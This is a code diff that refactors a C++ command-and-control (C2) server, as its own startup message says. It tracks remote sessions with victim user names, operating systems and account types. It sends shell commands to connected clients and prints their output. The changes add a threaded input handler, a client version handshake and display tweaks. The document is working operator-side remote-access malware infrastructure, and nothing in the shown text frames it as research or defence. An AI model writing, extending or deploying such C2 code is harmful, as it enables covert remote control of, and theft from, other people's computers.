@@ -9,6 +9,8 @@
 #include <iomanip>
 #include <sstream>
 #include <ctime>
+#include <thread>
+#include <atomic>
 
 #ifdef _WIN32
     #include <winsock2.h>
@@ -18,7 +20,6 @@
     typedef SOCKET sock_t;
     #define CLOSE_SOCKET closesocket
     #define SHUT_RDWR SD_BOTH
-    #define STDIN_FILENO 0
 #else
     #include <sys/socket.h>
     #include <netinet/in.h>
@@ -27,6 +28,7 @@
     #include <sys/select.h>
     #include <sys/time.h>
     #include <sys/types.h>
+    #include <fcntl.h>
     typedef int sock_t;
     #define CLOSE_SOCKET close
     #define SHUT_RDWR SHUT_RDWR
@@ -37,7 +39,7 @@
 const int PORT = 8080;
 const int BUFFER_SIZE = 4096;
 const int MAX_CLIENTS = 100;
-const std::string VERSION = "1.0";
+const std::string SERVER_VERSION = "1.0";
 
 struct Session {
     sock_t sock;
@@ -56,6 +58,7 @@ struct Session {
 std::map<int, Session> sessions;
 int session_counter = 0;
 int current_session = -1;
+std::atomic<bool> server_running(true);
 
 bool send_all(sock_t sock, const char* buf, size_t len) {
     while (len > 0) {
@@ -83,38 +86,52 @@ std::string get_client_ip(sockaddr_in client_addr) {
     return std::string(ip);
 }
 
+std::string format_duration(time_t seconds) {
+    int minutes = seconds / 60;
+    int secs = seconds % 60;
+    std::stringstream ss;
+    ss << minutes << "m " << secs << "s";
+    return ss.str();
+}
+
 void list_sessions() {
     std::cout << "\nSession List:\n";
-    std::cout << std::left << std::setw(8) << "ID"
+    std::cout << std::left 
+              << std::setw(5) << "ID"
               << std::setw(16) << "IP Address"
               << std::setw(10) << "Tag"
-              << std::setw(20) << "User@PC"
+              << std::setw(25) << "User@PC"
               << std::setw(10) << "Version"
-              << std::setw(10) << "Status"
+              << std::setw(15) << "Status"
               << std::setw(15) << "User Status"
               << std::setw(20) << "Operating System"
               << std::setw(15) << "Account Type" << std::endl;
     
-    std::cout << std::string(120, '-') << std::endl;
+    std::cout << std::string(130, '-') << std::endl;
     
     for (const auto& [id, session] : sessions) {
         if (session.status == "Disconnected") continue;
         
-        // Calculate session duration
         time_t now = time(nullptr);
-        double duration = difftime(now, session.connect_time);
-        int minutes = static_cast<int>(duration) / 60;
-        int seconds = static_cast<int>(duration) % 60;
-        std::string status = session.status + " (" + std::to_string(minutes) + "m " + std::to_string(seconds) + "s)";
+        time_t duration = now - session.connect_time;
+        std::string status = session.status + " (" + format_duration(duration) + ")";
         
-        std::cout << std::left << std::setw(8) << id
+        // Truncate long fields to prevent overflow
+        std::string user_pc = session.user_pc;
+        if (user_pc.length() > 24) user_pc = user_pc.substr(0, 22) + "..";
+        
+        std::string os = session.os;
+        if (os.length() > 19) os = os.substr(0, 17) + "..";
+        
+        std::cout << std::left 
+                  << std::setw(5) << id
                   << std::setw(16) << session.ip_address
                   << std::setw(10) << session.tag
-                  << std::setw(20) << session.user_pc
+                  << std::setw(25) << user_pc
                   << std::setw(10) << session.version
-                  << std::setw(10) << status
+                  << std::setw(15) << status
                   << std::setw(15) << session.user_status
-                  << std::setw(20) << session.os
+                  << std::setw(20) << os
                   << std::setw(15) << session.account_type << std::endl;
     }
     std::cout << std::endl;
@@ -132,13 +149,11 @@ void disconnect_session(int session_id) {
         return;
     }
     
-    // Send disconnect command to client
     std::string cmd = "disconnect";
     uint32_t cmd_len = htonl(static_cast<uint32_t>(cmd.size()));
     send_all(session.sock, reinterpret_cast<const char*>(&cmd_len), sizeof(cmd_len));
     send_all(session.sock, cmd.c_str(), cmd.size());
     
-    // Close socket and mark as disconnected
     shutdown(session.sock, SHUT_RDWR);
     CLOSE_SOCKET(session.sock);
     session.status = "Disconnected";
@@ -177,7 +192,7 @@ void interactive_session(int session_id) {
             return;
         }
         
-        // Send command length
+        // Send command
         uint32_t cmd_len = htonl(static_cast<uint32_t>(cmd.size()));
         if (!send_all(session.sock, reinterpret_cast<const char*>(&cmd_len), sizeof(cmd_len))) {
             std::cout << "Connection lost with session " << session_id << "\n";
@@ -185,8 +200,6 @@ void interactive_session(int session_id) {
             current_session = -1;
             return;
         }
-        
-        // Send command
         if (!send_all(session.sock, cmd.c_str(), cmd.size())) {
             std::cout << "Connection lost with session " << session_id << "\n";
             session.status = "Disconnected";
@@ -194,7 +207,7 @@ void interactive_session(int session_id) {
             return;
         }
         
-        // Receive directory length
+        // Receive directory
         uint32_t dir_len;
         if (!recv_all(session.sock, reinterpret_cast<char*>(&dir_len), sizeof(dir_len))) {
             std::cout << "Connection lost with session " << session_id << "\n";
@@ -204,7 +217,6 @@ void interactive_session(int session_id) {
         }
         dir_len = ntohl(dir_len);
         
-        // Receive updated directory
         std::vector<char> dir_buf(dir_len + 1, 0);
         if (!recv_all(session.sock, dir_buf.data(), dir_len)) {
             std::cout << "Connection lost with session " << session_id << "\n";
@@ -214,7 +226,7 @@ void interactive_session(int session_id) {
         }
         session.current_dir = std::string(dir_buf.data(), dir_len);
         
-        // Receive output length
+        // Receive output
         uint32_t output_len;
         if (!recv_all(session.sock, reinterpret_cast<char*>(&output_len), sizeof(output_len))) {
             std::cout << "Connection lost with session " << session_id << "\n";
@@ -224,19 +236,16 @@ void interactive_session(int session_id) {
         }
         output_len = ntohl(output_len);
         
-        if (output_len == 0) {
-            continue;
+        if (output_len > 0) {
+            std::vector<char> output(output_len + 1, 0);
+            if (!recv_all(session.sock, output.data(), output_len)) {
+                std::cout << "Connection lost with session " << session_id << "\n";
+                session.status = "Disconnected";
+                current_session = -1;
+                return;
+            }
+            std::cout << output.data() << std::endl;
         }
-        
-        // Receive output
-        std::vector<char> output(output_len + 1, 0);
-        if (!recv_all(session.sock, output.data(), output_len)) {
-            std::cout << "Connection lost with session " << session_id << "\n";
-            session.status = "Disconnected";
-            current_session = -1;
-            return;
-        }
-        std::cout << output.data() << std::endl;
     }
 }
 
@@ -273,16 +282,25 @@ void handle_command(const std::string& command) {
         std::cout << "  exit              - Shutdown the server\n\n";
     }
     else if (cmd == "exit") {
-        // Disconnect all sessions
         for (auto& [id, session] : sessions) {
             if (session.status != "Disconnected") {
                 disconnect_session(id);
             }
         }
-        exit(0);
+        server_running = false;
     }
     else {
         std::cout << "Unknown command. Type 'help' for available commands.\n";
+    }
+}
+
+void input_thread() {
+    while (server_running) {
+        std::string command;
+        std::getline(std::cin, command);
+        if (!command.empty()) {
+            handle_command(command);
+        }
     }
 }
 
@@ -304,7 +322,6 @@ int main() {
         return 1;
     }
 
-    // Set socket to non-blocking
     #ifdef _WIN32
         unsigned long mode = 1;
         ioctlsocket(server_fd, FIONBIO, &mode);
@@ -336,11 +353,14 @@ int main() {
         return 1;
     }
 
-    std::cout << "C2 Server listening on 127.0.0.1:" << PORT << std::endl;
+    std::cout << "C2 Server v" << SERVER_VERSION << " listening on 127.0.0.1:" << PORT << std::endl;
     std::cout << "Type 'help' for available commands\n\n";
 
-    while (true) {
-        // Check for new connections
+    // Start input handling thread
+    std::thread input_handler(input_thread);
+    input_handler.detach();
+
+    while (server_running) {
         sockaddr_in client_addr;
         #ifdef _WIN32
             int addrlen = sizeof(client_addr);
@@ -350,10 +370,16 @@ int main() {
         
         sock_t client_fd = accept(server_fd, (sockaddr*)&client_addr, &addrlen);
         if (client_fd != INVALID_SOCKET) {
-            // Get client IP
+            #ifdef _WIN32
+                mode = 0;
+                ioctlsocket(client_fd, FIONBIO, &mode);
+            #else
+                flags = fcntl(client_fd, F_GETFL, 0);
+                fcntl(client_fd, F_SETFL, flags & ~O_NONBLOCK);
+            #endif
+            
             std::string client_ip = get_client_ip(client_addr);
             
-            // Create new session
             Session new_session;
             new_session.sock = client_fd;
             new_session.ip_address = client_ip;
@@ -367,6 +393,16 @@ int main() {
                 std::vector<char> dir_buf(dir_len + 1, 0);
                 if (recv_all(client_fd, dir_buf.data(), dir_len)) {
                     new_session.current_dir = std::string(dir_buf.data(), dir_len);
+                }
+            }
+            
+            // Receive client version
+            uint32_t version_len;
+            if (recv_all(client_fd, reinterpret_cast<char*>(&version_len), sizeof(version_len))) {
+                version_len = ntohl(version_len);
+                std::vector<char> version_buf(version_len + 1, 0);
+                if (recv_all(client_fd, version_buf.data(), version_len)) {
+                    new_session.version = std::string(version_buf.data(), version_len);
                 }
             }
             
@@ -412,45 +448,12 @@ int main() {
                 }
             }
             
-            new_session.version = VERSION;
-            
-            // Add to sessions
             sessions[session_counter] = new_session;
             std::cout << "New session " << session_counter << " from " << client_ip 
                       << " (" << new_session.user_pc << ")\n";
             session_counter++;
         }
         
-        // Check for user input
-        #ifdef _WIN32
-            fd_set readfds;
-            FD_ZERO(&readfds);
-            FD_SET(STDIN_FILENO, &readfds);
-            struct timeval timeout = {0, 10000}; // 10ms
-            
-            if (select(1, &readfds, NULL, NULL, &timeout) > 0) {
-                if (FD_ISSET(STDIN_FILENO, &readfds)) {
-                    std::string command;
-                    std::getline(std::cin, command);
-                    handle_command(command);
-                }
-            }
-        #else
-            fd_set readfds;
-            FD_ZERO(&readfds);
-            FD_SET(STDIN_FILENO, &readfds);
-            struct timeval timeout = {0, 10000}; // 10ms
-            
-            if (select(STDIN_FILENO + 1, &readfds, NULL, NULL, &timeout) > 0) {
-                if (FD_ISSET(STDIN_FILENO, &readfds)) {
-                    std::string command;
-                    std::getline(std::cin, command);
-                    handle_command(command);
-                }
-            }
-        #endif
-        
-        // Small delay to prevent CPU overuse
         #ifdef _WIN32
             Sleep(10);
         #else
